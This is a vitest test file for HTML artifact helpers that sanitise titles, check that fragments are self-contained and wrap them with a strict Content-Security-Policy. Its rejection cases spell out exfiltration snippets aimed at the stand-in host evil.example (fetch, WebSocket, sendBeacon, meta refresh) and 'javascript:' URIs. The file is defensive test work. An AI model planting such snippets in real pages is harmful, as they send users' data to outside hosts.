/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  MAX_ARTIFACT_BYTES,
  sanitizeArtifactTitle,
  validateSelfContained,
  wrapArtifactHtml,
  byteLength,
} from './html.js';

describe('artifact html helpers', () => {
  describe('MAX_ARTIFACT_BYTES', () => {
    it('is 16 MB', () => {
      expect(MAX_ARTIFACT_BYTES).toBe(16 * 1024 * 1024);
    });
  });

  describe('sanitizeArtifactTitle', () => {
    it('collapses whitespace and trims', () => {
      expect(sanitizeArtifactTitle('  PR   walkthrough\n ')).toBe(
        'PR walkthrough',
      );
    });
    it('falls back to a default when empty/undefined', () => {
      expect(sanitizeArtifactTitle(undefined)).toBe('Artifact');
      expect(sanitizeArtifactTitle('   ')).toBe('Artifact');
    });
    it('clamps very long titles', () => {
      expect(sanitizeArtifactTitle('x'.repeat(500)).length).toBe(120);
    });
  });

  describe('validateSelfContained', () => {
    it('accepts an inline, body-only fragment', () => {
      const ok = `<h1>Hello</h1><style>.a{color:red}</style><script>const x=1;</script>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('accepts data: URI assets', () => {
      const ok = `<img src="data:image/png;base64,iVBOR=" alt="x">`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('accepts external hyperlinks', () => {
      const ok = `<a href="https://github.com/QwenLM/qwen-code/pull/1">PR</a>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('allows document tags mentioned in a leading comment or body text', () => {
      // Regression: the wrapper check looks only at the start (after leading
      // comments), so mentioning these tags in a comment or escaped code
      // sample must not be falsely rejected.
      const ok = `<!-- body-only fragment: no <html>/<head>/<body> --><p>Use the &lt;body&gt; element</p><pre><code>&lt;html&gt;</code></pre>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('rejects an empty fragment', () => {
      expect(validateSelfContained('   ')).toMatch(/empty/i);
    });

    it.each([
      ['<!doctype html><p>x</p>', /full-document/i],
      ['<html><body>x</body></html>', /full-document/i],
      ['<head><title>x</title></head>', /full-document/i],
    ])('rejects full-document wrapper %s', (frag, re) => {
      expect(validateSelfContained(frag)).toMatch(re);
    });

    it.each([
      '<script src="https://cdn.example.com/x.js"></script>',
      '<link rel="stylesheet" href="https://fonts.example.com/x.css">',
      '<img srcset="https://cdn.example.com/a.png 1x">',
      '<img src=&quot;https://cdn.example.com/a.png&quot;>',
      '<img src="//cdn.example.com/a.png">',
      '<video poster="https://cdn.example.com/poster.png"></video>',
      '<script src="http://evil/x.js"></script>',
    ])('rejects external resource %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<style>@import url(https://fonts.example.com/f.css);</style>',
      '<style>@import "https://fonts.example.com/f.css";</style>',
      '<style>body{background:url("https://cdn/x.png")}</style>',
      '<style>@font-face{src:url(//cdn/f.woff2)}</style>',
    ])('rejects external CSS %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<script>fetch("https://evil.example/upload")</script>',
      '<script>new WebSocket("wss://evil.example/ws")</script>',
      '<script>navigator.sendBeacon("https://evil.example", "x")</script>',
      '<meta http-equiv="refresh" content="0; url=https://evil.example">',
    ])('rejects browser network egress %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<a href="javascript:alert(1)">click</a>',
      '<a href=&quot;javascript:alert(1)&quot;>click</a>',
    ])('rejects javascript URIs %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/javascript: URI/i);
    });
  });

  describe('wrapArtifactHtml', () => {
    it('produces a complete document with doctype, title and body', () => {
      const html = wrapArtifactHtml('<h1>Hi</h1>', 'My Page');
      expect(html).toMatch(/^<!doctype html>/i);
      expect(html).toContain('<title>My Page</title>');
      expect(html).toContain('<h1>Hi</h1>');
      expect(html).toContain('viewport');
    });

    it('adds a CSP that blocks network egress', () => {
      const html = wrapArtifactHtml('<p>x</p>', 'My Page');
      expect(html).toContain('Content-Security-Policy');
      expect(html).toContain("connect-src 'none'");
      expect(html).toContain("default-src 'none'");
      expect(html).toContain("form-action 'none'");
      expect(html).toContain("base-uri 'none'");
      expect(html).toContain("frame-ancestors 'none'");
    });

    it('escapes the title', () => {
      const html = wrapArtifactHtml('<p>x</p>', 'a<b>&c');
      expect(html).toContain('<title>a&lt;b&gt;&amp;c</title>');
    });

    it('uses the default title when none given', () => {
      expect(wrapArtifactHtml('<p>x</p>', undefined)).toContain(
        '<title>Artifact</title>',
      );
    });
  });

  describe('byteLength', () => {
    it('counts UTF-8 bytes', () => {
      expect(byteLength('abc')).toBe(3);
      expect(byteLength('你好')).toBe(6);
    });
  });
});
